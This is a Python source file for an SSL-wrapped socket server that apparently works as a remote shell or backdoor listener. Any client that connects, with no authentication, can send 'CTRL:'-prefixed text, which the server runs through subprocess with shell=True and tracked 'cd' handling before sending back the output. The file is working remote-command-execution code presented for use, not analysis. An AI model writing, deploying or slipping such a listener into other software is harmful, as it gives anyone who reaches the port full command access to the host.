import socket
import threading
import subprocess
import os
import ssl

class SocketServer:
    def __init__(self, host='', port=12345, message_handler=None): #insert host ip
        self.host = host
        self.port = port
        self.server_socket = None
        self.clients = []
        self.message_handler = message_handler
        self.working_dir = os.getcwd()

    def start_server(self):
        raw_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        raw_socket.bind((self.host, self.port))
        raw_socket.listen(5)

        # Wrap with SSL
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(certfile='cert.pem', keyfile='key.pem')
        self.server_socket = context.wrap_socket(raw_socket, server_side=True)

        self.log(f"[+] SSL Server started on {self.host}:{self.port}")
        threading.Thread(target=self.accept_connections, daemon=True).start()

    def accept_connections(self):
        while True:
            client_sock, client_addr = self.server_socket.accept()
            self.clients.append(client_sock)
            self.log(f"[+] Client connected: {client_addr}")
            threading.Thread(target=self.handle_client, args=(client_sock, client_addr), daemon=True).start()

    def handle_client(self, client_sock, addr):
        while True:
            try:
                data = client_sock.recv(1024).decode()
                if not data:
                    break
                self.log(f"[>] From {addr}: {data}")

                # Simple protocol: commands start with CTRL:
                if data.startswith("CTRL:"):
                    command = data[5:].strip()
                    output = self.execute_command(command)
                    client_sock.sendall(f"DATA:{output}".encode())
            except Exception as e:
                self.log(f"[!] Error: {e}")
                break
        client_sock.close()
        self.log(f"[-] Client {addr} disconnected.")

    def execute_command(self, command):
        if command.startswith("cd "):
            path = command[3:].strip()
            try:
                new_path = os.path.abspath(os.path.join(self.working_dir, path))
                if os.path.isdir(new_path):
                    self.working_dir = new_path
                    return f"Changed directory to {self.working_dir}"
                else:
                    return f"No such directory: {new_path}"
            except Exception as e:
                return str(e)
        try:
            result = subprocess.check_output(command, shell=True, cwd=self.working_dir, stderr=subprocess.STDOUT, text=True)
        except subprocess.CalledProcessError as e:
            result = e.output
        return result

    def log(self, msg):
        print(msg)
        if self.message_handler:
            self.message_handler(msg)
